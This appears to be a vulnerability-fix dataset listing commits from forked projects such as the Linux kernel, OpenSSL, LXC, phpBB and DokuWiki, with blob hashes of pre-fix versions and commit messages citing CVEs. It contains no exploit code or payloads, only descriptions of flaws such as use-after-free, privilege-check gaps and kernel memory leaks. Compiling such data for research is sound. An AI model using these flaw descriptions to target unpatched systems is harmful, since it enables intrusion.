    ac424781d54d221885e40ddaeeb95a6cb619566d
    e10a4eeaa106495405d4f7bfd6e1b1a1ef643881
    e11c3d6d96cb42c0d87225550050d6ddcf18eb2d
    e72548b5897ec237dd7463374871538c81a84fd7
    f931ccfeefb01b34b7067caa2fe58774d0274edc
Projects:
    0-T-0_ps4-linux
Commit Message for ca4da5dd1f99fe9c59f1709fb43e818b18ad20e0:
KEYS: ensure we free the assoc array edit if edit is valid\n\n__key_link_end is not freeing the associated array edit structure and this leads to a 512 byte memory leak each time an identical existing key is added with add_key().\n\nThe reason the add_key() system call returns okay is that key_create_or_update() calls __key_link_begin() before checking to see whether it can update a key directly rather than adding/replacing - which it turns out it can.  Thus __key_link() is not called through __key_instantiate_and_link() and __key_link_end() must cancel the edit.\n\nCVE-2015-1333\n\nSigned-off-by: Colin Ian King <colin.king@canonical.com> Signed-off-by: David Howells <dhowells@redhat.com> Signed-off-by: James Morris <james.l.morris@oracle.com>

======================================================================
Commit With Fix: 
    5c3fcae78b63ac9dd56e36075903921bd9461f9e
File(s) In Commit: 
    src/lxc/attach.c
Blob(s) In Commit: 
    436ae7a56a9e1c031737e599620733d09b3cc3ce
Blob(s) Before Fix: 
    24ba899eee9984d596e7f45c0c8826c2c6a0f433
    69dafd4bf3744d9dee0ff928233a1b83ef12460a
    731d7a63294074a36766e778a92ec8a8c0ccd617
    ed6ea8d88ff11b22a5d3ac425739722f30a6045b
Projects:
    0x0916_lxc
Commit Message for 5c3fcae78b63ac9dd56e36075903921bd9461f9e:
CVE-2015-1334: Don't use the container's /proc during attach\n\nA user could otherwise over-mount /proc and prevent the apparmor profile or selinux label from being written which combined with a modified /bin/sh or other commonly used binary would lead to unconfined code execution.\n\nReported-by: Roman Fiedler Signed-off-by: Stéphane Graber <stgraber@ubuntu.com>

======================================================================
Commit With Fix: 
    2c5816b4beccc8ba709144539f6fdd764f8fa49c
File(s) In Commit: 
    fs/fuse/cuse.c
Blob(s) In Commit: 
    8e3ee1936c7e38ba381b33c26b2f1847422a613f
Blob(s) Before Fix: 
    13b691a8a7d2ea4403161213486538dadf75a217
    28d0c7abba1c2fa7748d3b1c2874b855427b3897
    3426521f3205cce09a98b8a1bd01ffe9e44f84c0
    966ace8b243fa39796fbdd788c4d83ebd6024217
    adbfd66b380f6bbc3d275234851746ba0c33c6d4
    aef34b1e635e9a424659e721a8a891a3084b8bf4
    b96a49b37d663e747d1caec30add48c84fdda14e
    c5b6b71654893b2bb7fe0276a40ac57ddb3350a0
    e397b675b029a6e9f2d6f7f59a0d73acec412fbe
    e5bbf748b6987a922fa211e3edb083346927f3b6
    eae2c11268bcb484075cfd08482beeb172dd66bc
Projects:
    0-T-0_ps4-linux
Commit Message for 2c5816b4beccc8ba709144539f6fdd764f8fa49c:
cuse: fix memory leak\n\nThe problem is that fuse_dev_alloc() acquires an extra reference to cc.fc, and the original ref count is never dropped.\n\nReported-by: Colin Ian King <colin.king@canonical.com> Signed-off-by: Miklos Szeredi <miklos@szeredi.hu> Fixes: cc080e9e9be1 ("fuse: introduce per-instance fuse_dev structure") Cc: <stable@vger.kernel.org> # v4.2+

======================================================================
Commit With Fix: 
    8ee2a503e102b1a43ec4d83113dc275ab20a869a
File(s) In Commit: 
    lxcfs.c
Blob(s) In Commit: 
    5eb63c8e1777c695d71afbdec2990f1c8b257f89
Blob(s) Before Fix: 
    2c5aca4ece6482b6e20e70297cb7c654b1da059b
Projects:
    893751156_lxcfs
Commit Message for 8ee2a503e102b1a43ec4d83113dc275ab20a869a:
Implement privilege check when moving tasks\n\nWhen writing pids to a tasks file in lxcfs, lxcfs was checking for privilege over the tasks file but not over the pid being moved.  Since the cgm_movepid request is done as root on the host, not with the requestor's credentials, we must copy the check which cgmanager was doing to ensure that the requesting task is allowed to change the victim task's cgroup membership.\n\nThis is CVE-2015-1344 https://bugs.launchpad.net/ubuntu/+source/lxcfs/+bug/1512854\n\nSigned-off-by: Serge Hallyn <serge.hallyn@ubuntu.com>

======================================================================
Commit With Fix: 
    b38b3ca7235002137cc9ff74b3c24a4a78c9c2d1
File(s) In Commit: 
    client.inc.php
Blob(s) In Commit: 
    64877cc46b004f2f9ef3d3a2c4c69a24b81f8b1d
Blob(s) Before Fix: 
    bb8e8badbe7fdce1ef104276bff36448aa4126a6
Projects:
    01remi_osTicket
Commit Message for b38b3ca7235002137cc9ff74b3c24a4a78c9c2d1:
xss: Fix possible vuln setting client lang pref

======================================================================
Commit With Fix: 
    600ddd6825543962fb807884169e57b580dba208
File(s) In Commit: 
    net/sctp/associola.c
Blob(s) In Commit: 
    26d06dbcc1c8e137798be5071848990fe00a7fe6
Blob(s) Before Fix: 
    03689b97ea7832918a77b916db4991ae00ca54ca
    06a9ee6b2d3a577a73b62028a711f5f801fe13f0
    16911a84f8507d9fed0c2465929dc3ea2d97e04a
    197c3f59ecbf1d7975a987e57c13023ac9e2b357
    31ed008c8e13e88b88935c5d83a503bdc089076e
    39579c3e0d14c12f165e420be064d7fbf248c0ad
    6360a14edeaba43263bc62074ad01f7495da33d6
    67c6823e563fe8f2716a30145c41a4408c7e5d9c
    9de23a222d3f7b9f33e650483d749d3341c51dc0
    a88b8524846eb0b6a03d7f05f2e8910efd432305
    acd2edbc073ebf4ad334a4b0a16ff7b45413fac5
    b45ed1f96921285bf75badfeaa5caf922118bb4d
    ca4a1a1b8e693b0e743e64a5d3410d133ff7ae17
    da54d2922f51409e9fb8f520cb0f976a5c10b0f5
    ee13d28d39d10702096f733ee8d88aa862459952
    f791edd64d6c0c76dea92888c44530cd1af21a23
Projects:
    0-T-0_ps4-linux
Commit Message for 600ddd6825543962fb807884169e57b580dba208:
net: sctp: fix slab corruption from use after free on INIT collisions\n\nWhen hitting an INIT collision case during the 4WHS with AUTH enabled, as already described in detail in commit 1be9a950c646 ("net: sctp: inherit auth_capable on INIT collisions"), it can happen that we occasionally still remotely trigger the following panic on server side which seems to have been uncovered after the fix from commit 1be9a950c646 ...\n\n[  533.876389] BUG: unable to handle kernel paging request at 00000000ffffffff [  533.913657] IP: [<ffffffff811ac385>] __kmalloc+0x95/0x230 [  533.940559] PGD 5030f2067 PUD 0 [  533.957104] Oops: 0000 [#1] SMP [  533.974283] Modules linked in: sctp mlx4_en [...] [  534.939704] Call Trace: [  534.951833]  [<ffffffff81294e30>] ? crypto_init_shash_ops+0x60/0xf0 [  534.984213]  [<ffffffff81294e30>] crypto_init_shash_ops+0x60/0xf0 [  535.015025]  [<ffffffff8128c8ed>] __crypto_alloc_tfm+0x6d/0x170 [  535.045661]  [<ffffffff8128d12c>] crypto_alloc_base+0x4c/0xb0 [  535.074593]  [<ffffffff8160bd42>] ? _raw_spin_lock_bh+0x12/0x50 [  535.105239]  [<ffffffffa0418c11>] sctp_inet_listen+0x161/0x1e0 [sctp] [  535.138606]  [<ffffffff814e43bd>] SyS_listen+0x9d/0xb0 [  535.166848]  [<ffffffff816149a9>] system_call_fastpath+0x16/0x1b\n\n... or depending on the the application, for example this one:\n\n[ 1370.026490] BUG: unable to handle kernel paging request at 00000000ffffffff [ 1370.026506] IP: [<ffffffff811ab455>] kmem_cache_alloc+0x75/0x1d0 [ 1370.054568] PGD 633c94067 PUD 0 [ 1370.070446] Oops: 0000 [#1] SMP [ 1370.085010] Modules linked in: sctp kvm_amd kvm [...] [ 1370.963431] Call Trace: [ 1370.974632]  [<ffffffff8120f7cf>] ? SyS_epoll_ctl+0x53f/0x960 [ 1371.000863]  [<ffffffff8120f7cf>] SyS_epoll_ctl+0x53f/0x960 [ 1371.027154]  [<ffffffff812100d3>] ? anon_inode_getfile+0xd3/0x170 [ 1371.054679]  [<ffffffff811e3d67>] ? __alloc_fd+0xa7/0x130 [ 1371.080183]  [<ffffffff816149a9>] system_call_fastpath+0x16/0x1b\n\nWith slab debugging enabled, we can see that the poison has been overwritten:\n\n[  669.826368] BUG kmalloc-128 (Tainted: G        W     ): Poison overwritten [  669.826385] INFO: 0xffff880228b32e50-0xffff880228b32e50. First byte 0x6a instead of 0x6b [  669.826414] INFO: Allocated in sctp_auth_create_key+0x23/0x50 [sctp] age=3 cpu=0 pid=18494 [  669.826424]  __slab_alloc+0x4bf/0x566 [  669.826433]  __kmalloc+0x280/0x310 [  669.826453]  sctp_auth_create_key+0x23/0x50 [sctp] [  669.826471]  sctp_auth_asoc_create_secret+0xcb/0x1e0 [sctp] [  669.826488]  sctp_auth_asoc_init_active_key+0x68/0xa0 [sctp] [  669.826505]  sctp_do_sm+0x29d/0x17c0 [sctp] [...] [  669.826629] INFO: Freed in kzfree+0x31/0x40 age=1 cpu=0 pid=18494 [  669.826635]  __slab_free+0x39/0x2a8 [  669.826643]  kfree+0x1d6/0x230 [  669.826650]  kzfree+0x31/0x40 [  669.826666]  sctp_auth_key_put+0x19/0x20 [sctp] [  669.826681]  sctp_assoc_update+0x1ee/0x2d0 [sctp] [  669.826695]  sctp_do_sm+0x674/0x17c0 [sctp]\n\nSince this only triggers in some collision-cases with AUTH, the problem at heart is that sctp_auth_key_put() on asoc->asoc_shared_key is called twice when having refcnt 1, once directly in sctp_assoc_update() and yet again from within sctp_auth_asoc_init_active_key() via sctp_assoc_update() on the already kzfree'd memory, which is also consistent with the observation of the poison decrease from 0x6b to 0x6a (note: the overwrite is detected at a later point in time when poison is checked on new allocation).\n\nReference counting of auth keys revisited:\n\nShared keys for AUTH chunks are being stored in endpoints and associations in endpoint_shared_keys list. On endpoint creation, a null key is being added  on association creation, all endpoint shared keys are being cached and thus cloned over to the association. struct sctp_shared_key only holds a pointer to the actual key bytes, that is, struct sctp_auth_bytes which keeps track of users internally through refcounting. Naturally, on assoc or enpoint destruction, sctp_shared_key are being destroyed directly and the reference on sctp_auth_bytes dropped.\n\nUser space can add keys to either list via setsockopt(2) through struct sctp_authkey and by passing that to sctp_auth_set_key() which replaces or adds a new auth key. There, sctp_auth_create_key() creates a new sctp_auth_bytes with refcount 1 and in case of replacement drops the reference on the old sctp_auth_bytes. A key can be set active from user space through setsockopt() on the id via sctp_auth_set_active_key(), which iterates through either endpoint_shared_keys and in case of an assoc, invokes (one of various places) sctp_auth_asoc_init_active_key().\n\nsctp_auth_asoc_init_active_key() computes the actual secret from local's and peer's random, hmac and shared key parameters and returns a new key directly as sctp_auth_bytes, that is asoc->asoc_shared_key, plus drops the reference if there was a previous one. The secret, which where we eventually double drop the ref comes from sctp_auth_asoc_set_secret() with intitial refcount of 1, which also stays unchanged eventually in sctp_assoc_update(). This key is later being used for crypto layer to set the key for the hash in crypto_hash_setkey() from sctp_auth_calculate_hmac().\n\nTo close the loop: asoc->asoc_shared_key is freshly allocated secret material and independant of the sctp_shared_key management keeping track of only shared keys in endpoints and assocs. Hence, also commit 4184b2a79a76 ("net: sctp: fix memory leak in auth key management") is independant of this bug here since it concerns a different layer (though same structures being used eventually). asoc->asoc_shared_key is reference dropped correctly on assoc destruction in sctp_association_free() and when active keys are being replaced in sctp_auth_asoc_init_active_key(), it always has a refcount of 1. Hence, it's freed prematurely in sctp_assoc_update(). Simple fix is to remove that sctp_auth_key_put() from there which fixes these panics.\n\nFixes: 730fc3d05cd4 ("[SCTP]: Implete SCTP-AUTH parameter processing") Signed-off-by: Daniel Borkmann <dborkman@redhat.com> Acked-by: Vlad Yasevich <vyasevich@gmail.com> Acked-by: Neil Horman <nhorman@tuxdriver.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    23069a13e203985ab124d1139e8de74b12778449
File(s) In Commit: 
    phpBB/includes/ucp/ucp_pm_options.php
Blob(s) In Commit: 
    1d5c0ecce38535202b153b861362ae06ddccc04f
Blob(s) Before Fix: 
    58c2d087c8b0f27a9b558c59a7d770f7e48a50f8
    efa390ed87965352df240adb8efd437aa796bad7
Projects:
    007durgesh219_phpbb
Commit Message for 23069a13e203985ab124d1139e8de74b12778449:
[ticket/13526] Correctly validate the ucp_pm_options form key.\n\nPHPBB3-13526

======================================================================
Commit With Fix: 
    c93bc100ec93fc78940fbdca9b6b009101858309
File(s) In Commit: 
    index.php
Blob(s) In Commit: 
    09ae3db855968df278fafc870a6d535d73d89292
Blob(s) Before Fix: 
    7903f9529a82588f2fbfbf21dc3c1c1576183533
Projects:
    nean_pragyan
Commit Message for c93bc100ec93fc78940fbdca9b6b009101858309:
Update index.php

======================================================================
Commit With Fix: 
    a2f18db0c68fec96631c10cad9384c196e9008ac
File(s) In Commit: 
    net/netfilter/nf_tables_api.c
Blob(s) In Commit: 
    3b3ddb4fb9ee122a5b6d3a39450be38a64d6f614
Blob(s) Before Fix: 
    11ab4b078f3bb68323b1f050f3a1d5e83d271f36
    129a8daa4abf31959801e99c4f2fbfc7f1aab230
    556a0dfa4abc07f7ed7bde511e07db1a85c99ecd
    66e8425dbfe77b11e41eb7c97c68f3778ee0c9e7
    71a9f49a768b887dec1b361b78147016cb2b9307
    ab4566cfcbe497beea641dff934e24dc3341096b
    adce01e8bb57e7fb9794eebceae274707d96899e
    deeb95fb702833ac9d2dc9ec39d57778e31a570c
Projects:
    0-T-0_ps4-linux
Commit Message for a2f18db0c68fec96631c10cad9384c196e9008ac:
netfilter: nf_tables: fix flush ruleset chain dependencies\n\nJumping between chains doesn't mix well with flush ruleset. Rules from a different chain and set elements may still refer to us.\n\n[  353.373791] ------------[ cut here ]------------ [  353.373845] kernel BUG at net/netfilter/nf_tables_api.c:1159! [  353.373896] invalid opcode: 0000 [#1] SMP [  353.373942] Modules linked in: intel_powerclamp uas iwldvm iwlwifi [  353.374017] CPU: 0 PID: 6445 Comm: 31c3.nft Not tainted 3.18.0 #98 [  353.374069] Hardware name: LENOVO 5129CTO/5129CTO, BIOS 6QET47WW (1.17 ) 07/14/2010 [...] [  353.375018] Call Trace: [  353.375046]  [<ffffffff81964c31>] ? nf_tables_commit+0x381/0x540 [  353.375101]  [<ffffffff81949118>] nfnetlink_rcv+0x3d8/0x4b0 [  353.375150]  [<ffffffff81943fc5>] netlink_unicast+0x105/0x1a0 [  353.375200]  [<ffffffff8194438e>] netlink_sendmsg+0x32e/0x790 [  353.375253]  [<ffffffff818f398e>] sock_sendmsg+0x8e/0xc0 [  353.375300]  [<ffffffff818f36b9>] ? move_addr_to_kernel.part.20+0x19/0x70 [  353.375357]  [<ffffffff818f44f9>] ? move_addr_to_kernel+0x19/0x30 [  353.375410]  [<ffffffff819016d2>] ? verify_iovec+0x42/0xd0 [  353.375459]  [<ffffffff818f3e10>] ___sys_sendmsg+0x3f0/0x400 [  353.375510]  [<ffffffff810615fa>] ? native_sched_clock+0x2a/0x90 [  353.375563]  [<ffffffff81176697>] ? acct_account_cputime+0x17/0x20 [  353.375616]  [<ffffffff8110dc78>] ? account_user_time+0x88/0xa0 [  353.375667]  [<ffffffff818f4bbd>] __sys_sendmsg+0x3d/0x80 [  353.375719]  [<ffffffff81b184f4>] ? int_check_syscall_exit_work+0x34/0x3d [  353.375776]  [<ffffffff818f4c0d>] SyS_sendmsg+0xd/0x20 [  353.375823]  [<ffffffff81b1826d>] system_call_fastpath+0x16/0x1b\n\nRelease objects in this order: rules -> sets -> chains -> tables, to make sure no references to chains are held anymore.\n\nReported-by: Asbjoern Sloth Toennesen <asbjorn@asbjorn.biz> Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>

======================================================================
Commit With Fix: 
    4924b37ee01f71ae19c94a8934b80eeb2f677932
File(s) In Commit: 
    crypto/bn/bn_gf2m.c
Blob(s) In Commit: 
    cd137c36496f2322e4e4e4e2df12a72e09356bf9
Blob(s) Before Fix: 
    50d7c74085250019f181526611d067e57178bb9a
    73e1e8f11bbcbef9d61dc341757b9f891260da93
    aeee49a0156f2a2b15f8d246907dd3f67deaa8dd
    b2222a06c93f868ce8b1da6f90e170c59cf997af
Projects:
    0902710055_openssl
Commit Message for 4924b37ee01f71ae19c94a8934b80eeb2f677932:
bn/bn_gf2m.c: avoid infinite loop wich malformed ECParamters.\n\nCVE-2015-1788\n\nReviewed-by: Matt Caswell <matt@openssl.org>

======================================================================
Commit With Fix: 
    f48b83b4fb7d6689584cf25f61ca63a4891f5b11
File(s) In Commit: 
    crypto/x509/x509_vfy.c
Blob(s) In Commit: 
    a920ea70b1500a59a355a5e52cdaad48fd40fa25
Blob(s) Before Fix: 
    7e00436ec09c42946a9cfba52f826d622636e22c
Projects:
    0902710055_openssl
Commit Message for f48b83b4fb7d6689584cf25f61ca63a4891f5b11:
Fix length checks in X509_cmp_time to avoid out-of-bounds reads.\n\nAlso tighten X509_cmp_time to reject more than three fractional seconds in the time  and to reject trailing garbage after the offset.\n\nCVE-2015-1789\n\nReviewed-by: Viktor Dukhovni <viktor@openssl.org> Reviewed-by: Richard Levitte <levitte@openssl.org>

======================================================================
Commit With Fix: 
    59302b600e8d5b77ef144e447bb046fd7ab72686
File(s) In Commit: 
    crypto/pkcs7/pk7_doit.c
Blob(s) In Commit: 
    cc2f3be5543e3d5395efae6bb28115beb3061e72
Blob(s) Before Fix: 
    0dd22ec5754478b3929bed99f1c309d80790b565
    2c8dd8713637e3989d641f0a7ed88cf779d06d00
    54b7b0785ab62b3dd4293bac78d8cd1306eebfc4
    639e2174256df5e7981b3ab7acf66e0fc770d80f
    a0559b124ee1e644b757c785107533286d600cce
    e5ad95fb1d9efc687caa876dc38c526fea252b4f
Projects:
    0902710055_openssl
Commit Message for 59302b600e8d5b77ef144e447bb046fd7ab72686:
PKCS#7: Fix NULL dereference with missing EncryptedContent.\n\nCVE-2015-1790\n\nReviewed-by: Rich Salz <rsalz@openssl.org>

======================================================================
Commit With Fix: 
    cd30f03ac5bf2962f44bd02ae8d88245dff2f12c
File(s) In Commit: 
    crypto/cms/cms_smime.c
Blob(s) In Commit: 
    8f1aa38ccc5b3bd56ab755ba72f8084fa980320d
Blob(s) Before Fix: 
    204595b908c46f1393fc47215831ef5eb0d9866a
Projects:
    0902710055_openssl
Commit Message for cd30f03ac5bf2962f44bd02ae8d88245dff2f12c:
Canonicalise input in CMS_verify.\n\nIf content is detached and not binary mode translate the input to CRLF format. Before this change the input was verified verbatim which lead to a discrepancy between sign and verify.

======================================================================
Commit With Fix: 
    e11298d7155e9982749483ca5538e46090caef9c
File(s) In Commit: 
    salt/modules/serverdensity_device.py
Blob(s) In Commit: 
    b8f577f701059ab3db0cf1396750f91f4dc1645b
Blob(s) Before Fix: 
    3133be0b4c51c8d1a35989660a8c9c50da3533e4
    6040d5cbbca104e655a5694dd22b30da5090369d
Projects:
    0decimal0_salt
Commit Message for e11298d7155e9982749483ca5538e46090caef9c:
Move install.sh to cachedir for serverdensity_device

======================================================================
Commit With Fix: 
    6b8d9117ccb4f81b1244aafa7bc70ef8fa45fc49
File(s) In Commit: 
    net/llc/sysctl_net_llc.c
Blob(s) In Commit: 
    799bafc2af39ea191e3753c88c3f921e44a77162
Blob(s) Before Fix: 
    57b9304d444c115d2e6ef00c17c1f25d41b0f50d
    612a5ddaf93b1ab1b5a524c5efef8d6b1f769038
    68ad890ee9661f6ebae9fa01166904e38faaa3ba
    8443a6d841b0645859328b73f0740b7872fdcb64
    b0a2c84a402054bfb26ea4b97dca2f285f3c683c
    be078ec43d7f97d42276ca8511d5db90be4bc579
    d75306b9c2f3e80d5fe0ed90d511d646b8a0728c
    db4e7dfe17f88f43146a52e34ff4d3073b33e81d
    e2ebe358626313956ac432c8377ef1564b44805b
Projects:
    0-T-0_ps4-linux
Commit Message for 6b8d9117ccb4f81b1244aafa7bc70ef8fa45fc49:
net: llc: use correct size for sysctl timeout entries\n\nThe timeout entries are sizeof(int) rather than sizeof(long), which means that when they were getting read we'd also leak kernel memory to userspace along with the timeout values.\n\nSigned-off-by: Sasha Levin <sasha.levin@oracle.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    db27ebb111e9f69efece08e4cb6a34ff980f8896
File(s) In Commit: 
    net/rds/sysctl.c
Blob(s) In Commit: 
    c173f69e1479bfaf643b9e5c69f4c9a151b18c67
Blob(s) Before Fix: 
    25ad0c77a26cd16cca2d96681fae4f77373757bf
    307dc5c1be153d3326dbd0fb62e4874241fc559a
    35773ad6d23de4cf8d390ec3f1e3b1689ce19405
    907214b4c4d071444dbb67ae3cb4559fe3a8267a
    b5cb2aa08f33aa62ac5bff73684fc228f74dce7e
    c3b0cd43eb56689e395581c4757402bad531e271
    e381bbcd9cc1c37d93eb19647b2a2262d8d2bae9
    fc6cbe8278561a8dd8eeeefadc1a5ae1b5d8f288
Projects:
    0-T-0_ps4-linux
Commit Message for db27ebb111e9f69efece08e4cb6a34ff980f8896:
net: rds: use correct size for max unacked packets and bytes\n\nMax unacked packets/bytes is an int while sizeof(long) was used in the sysctl table.\n\nThis means that when they were getting read we'd also leak kernel memory to userspace along with the timeout values.\n\nSigned-off-by: Sasha Levin <sasha.levin@oracle.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    9425e16437439e68c7d96abef922167d68fafaff
File(s) In Commit: 
    rw.cpp
Blob(s) In Commit: 
    0b9318bfd1251628470cccb28017cfefeb61f8e8
Blob(s) Before Fix: 
    cdd9f2d22239a0f901fc5e16218728acd92eb369
Projects:
    1847123212_cryptopp
Commit Message for 9425e16437439e68c7d96abef922167d68fafaff:
Fix for CVE-2015-2141. Thanks to Evgeny Sidorov for reporting. Squaring to satisfy Jacobi requirements suggested by JPM.

======================================================================
Commit With Fix: 
    4970ad24ce49ec76a0ee67bca7594f918ced2f5f
File(s) In Commit: 
    lib/plugins/acl/remote.php
Blob(s) In Commit: 
    9433b770159f1598addc63f46782a779115ad70b
Blob(s) Before Fix: 
    6d5201cf61a6b3933bc642ff46fb3a68375db39f
Projects:
    122800_dokuwiki
Commit Message for 4970ad24ce49ec76a0ee67bca7594f918ced2f5f:
check permissions in ACL plugin's RPC API component. #1056\n\nSecurity Fix\n\nSeverity: Medium Type:     Remote Priviledge Escalation Remote:   yes\n\nVulnerability Details:\n\nThis fixes a security hole in the ACL plugins remote API component. The plugin failed to check for superuser permissions before executing ACL addition or deletion. This means everybody with permissions to call the XMLRPC API also had permissions to set up their own ACL rules and thus circumventing any existing rules.\n\nRisk Assessment:\n\nThe XMLRPC API in DokuWiki is marked experimental and off by default. It also implements an additional safeguard by giving access to a configured circle of users and groups only. So only a minor number of DokuWiki installations will be affected at all. For affected installations the risk is high if users with access to the API are not to be trusted. Thus the overall severity of medium.\n\nResolution:\n\nInstallations applying this commit are safe. A hotfix is about to be released. Meanwhile users are advised to disable the XMLRPC API in the config manager.

======================================================================
Commit With Fix: 
    b2f1e895038a5700bf8e81fb9a5da36cbdea0eeb
File(s) In Commit: 
    libraries/select_lang.lib.php
Blob(s) In Commit: 
    ab4c72554b7e4e8f49b5e7025c83f013dbedf9a1
Blob(s) Before Fix: 
    08a5b2fa139b1014a9ad0d86b5ba054546db8389
    2bd1a8d8f1330f594823830452327cbd5cff1d7e
    5a943ce2754629695591b29167862456dcca84d1
    6712eb68d192a7595b81278b50d60e6b320b12c9
    84b47d70a778c02dd3c8980d42b92289c6352d5e
Projects:
    007durgesh219_phpmyadmin
Commit Message for b2f1e895038a5700bf8e81fb9a5da36cbdea0eeb:
[security] Risk of BREACH attack\n\nThanks to Michal Čihař for the message suggestion.\n\nSigned-off-by: Marc Delisle <marc@infomarc.info>

======================================================================
Commit With Fix: 
    3bd8afbff29e50b38f889b2f688785a669b9aafc
File(s) In Commit: 
    requests/sessions.py
Blob(s) In Commit: 
    9d5498c6dbce1fc52cfbb1e02cabcce2eec49905
Blob(s) Before Fix: 
    4f3069635332a9fe3284e332eccb7d1e38f62fe4
Projects:
    01pooja_requests
Commit Message for 3bd8afbff29e50b38f889b2f688785a669b9aafc:
Don't ascribe cookies to the target domain.

======================================================================
Commit With Fix: 
    a0fb65205c7d7ff95f00eb9fd88e93b300f30c3d
File(s) In Commit: 
    src/node/utils/ExportEtherpad.js
Blob(s) In Commit: 
    46ae0d7af9e626c821f3f728b87925f7c0a814a2
Blob(s) Before Fix: 
    36df452da1b5fc884eb4d87762642888c9e37f3b
    4f91e4e39a675a5d48f6adc125bd9e8914b85629
    b7d4385230b28e243f6c9cd533a7fbe80bf37174
Projects:
    00SteinsGate00_etherpad-lite
Commit Message for a0fb65205c7d7ff95f00eb9fd88e93b300f30c3d:
oops, fix export with wildcards

======================================================================
Commit With Fix: 
    f343f0dbd0a2e87f17cd74f14186ed73e3fbdbfa
File(s) In Commit: 
    c++/src/capnp/layout.c++
Blob(s) In Commit: 
    a43dbcd6b2aa8bc3d3bebf65223046e18541afcb
Blob(s) Before Fix: 
    325ca403d66fda955504a7bf0ad0407318178827
Projects:
    1815368076_capnproto
Commit Message for f343f0dbd0a2e87f17cd74f14186ed73e3fbdbfa:
SECURITY: Integer overflow in pointer validation.\n\nDetails: https://github.com/sandstorm-io/capnproto/tree/master/security-advisories/2014-03-02-0-c++-integer-overflow.md

======================================================================
Commit With Fix: 
    26bcceda72372211063d62aab7e45665faa83633
File(s) In Commit: 
    c++/src/capnp/layout.c++
Blob(s) In Commit: 
    5956bb9993efeec27ab068ea465ef6af042a8c28
Blob(s) Before Fix: 
    a43dbcd6b2aa8bc3d3bebf65223046e18541afcb
Projects:
    1815368076_capnproto
Commit Message for 26bcceda72372211063d62aab7e45665faa83633:
SECURITY: Integer underflow in pointer validation.\n\nDetails: https://github.com/sandstorm-io/capnproto/tree/master/security-advisories/2014-03-02-1-c++-integer-underflow.md

======================================================================
Commit With Fix: 
    b371da6b2d68b4cdd0f21d6342af6c42794f998b
File(s) In Commit: 
    mcs/class/Mono.Security/Mono.Security.Protocol.Tls/RecordProtocol.cs
Blob(s) In Commit: 
    e194013a637afde4ebff8792f8cc2e8884ba4381
Blob(s) Before Fix: 
    166f12f0d23c7d0790fc722c2d140494f75b1b11
    589510685a63193d51b8308798be26820c61cf76
    9ef45da2c4452226391c9bf53552677fdb4298d8
    afa2a0474821e4944c2b3b7e18c2458bd7819e0c
    e857e70882922186e917972237e0ab5f8673f237
    e8ae131f2a50d4bf11b748b348ca2b37a3b45987
Projects:
    004307ec_mono
Commit Message for b371da6b2d68b4cdd0f21d6342af6c42794f998b:
Remove the client-side SSLv2 fallback.\n\n    There's almost no SSLv3 web site left so a v2 fallback is only extra     code we do not need to carry forward.

======================================================================
Commit With Fix: 
    f84598bd7c851f8b0bf8cd0d7c3be0d73c432ff4
File(s) In Commit: 
    arch/x86/kernel/cpu/microcode/intel_early.c
Blob(s) In Commit: 
    5e109a31f62bb0168f704bd04d725b8ff580df6e
Blob(s) Before Fix: 
    37ea89c115202da99862b6a1325672d29fdcbc9e
    71c5817a005d09a52b09ff04c1124a68f85def94
    b88343f7a3b321f04a1ca03db587b43051aeba89
    ec9df6f9cd47b35e7f4d6059eb094f922420c5cf
Projects:
    0-T-0_ps4-linux
Commit Message for f84598bd7c851f8b0bf8cd0d7c3be0d73c432ff4:
x86/microcode/intel: Guard against stack overflow in the loader\n\nmc_saved_tmp is a static array allocated on the stack, we need to make sure mc_saved_count stays within its bounds, otherwise we're overflowing the stack in _save_mc(). A specially crafted microcode header could lead to a kernel crash or potentially kernel execution.\n\nSigned-off-by: Quentin Casasnovas <quentin.casasnovas@oracle.com> Cc: "H. Peter Anvin" <hpa@zytor.com> Cc: Fenghua Yu <fenghua.yu@intel.com> Link: http://lkml.kernel.org/r/1422964824-22056-1-git-send-email-quentin.casasnovas@oracle.com Signed-off-by: Borislav Petkov <bp@suse.de>

======================================================================
Commit With Fix: 
    06c8173eb92bbfc03a0fe8bb64315857d0badd06
File(s) In Commit: 
    arch/x86/include/asm/xsave.h
Blob(s) In Commit: 
    c9a6d68b8d623b84d169f61c4680c194ea8d137a
Blob(s) Before Fix: 
    0415cdabb5a663d1684284525a3fe24b7b3cd359
    554738963b28cf47dd76fa9947338bb1eae5a0d0
    5fa9770035dc935c0a90899f470e668ab889ec7f
    7e7a79ada6584fa4161e285f1f32181a29baa70e
    c6ce2452f10ce2dba165593d3492a9eb5056f4d3
    d82b80405e45e96944f223bf4b392997b8cb7ac0
    d949ef28c48bd9c423c5c668a1b0ce61ed70cac5
Projects:
    0-T-0_ps4-linux
Commit Message for 06c8173eb92bbfc03a0fe8bb64315857d0badd06:
x86/fpu/xsaves: Fix improper uses of __ex_table\n\nCommit:\n\n  f31a9f7c7169 ("x86/xsaves: Use xsaves/xrstors to save and restore xsave area")\n\nintroduced alternative instructions for XSAVES/XRSTORS and commit:\n\n  adb9d526e982 ("x86/xsaves: Add xsaves and xrstors support for booting time")\n\nadded support for the XSAVES/XRSTORS instructions at boot time.\n\nUnfortunately both failed to properly protect them against faulting:\n\nThe 'xstate_fault' macro will use the closest label named '1' backward and that ends up in the .altinstr_replacement section rather than in .text. This means that the kernel will never find in the __ex_table the .text address where this instruction might fault, leading to serious problems if userspace manages to trigger the fault.\n\nSigned-off-by: Quentin Casasnovas <quentin.casasnovas@oracle.com> Signed-off-by: Jamie Iles <jamie.iles@oracle.com> [ Improved the changelog, fixed some whitespace noise. ] Acked-by: Borislav Petkov <bp@alien8.de> Acked-by: Linus Torvalds <torvalds@linux-foundation.org> Cc: <stable@vger.kernel.org> Cc: Allan Xavier <mr.a.xavier@gmail.com> Cc: H. Peter Anvin <hpa@zytor.com> Cc: Thomas Gleixner <tglx@linutronix.de> Fixes: adb9d526e982 ("x86/xsaves: Add xsaves and xrstors support for booting time") Fixes: f31a9f7c7169 ("x86/xsaves: Use xsaves/xrstors to save and restore xsave area") Signed-off-by: Ingo Molnar <mingo@kernel.org>

======================================================================
Commit With Fix: 
    4de930efc23b92ddf88ce91c405ee645fe6e27ea
File(s) In Commit: 
    net/socket.c
Blob(s) In Commit: 
    245330ca0015c2fd2548ead861d379714151c901
Blob(s) Before Fix: 
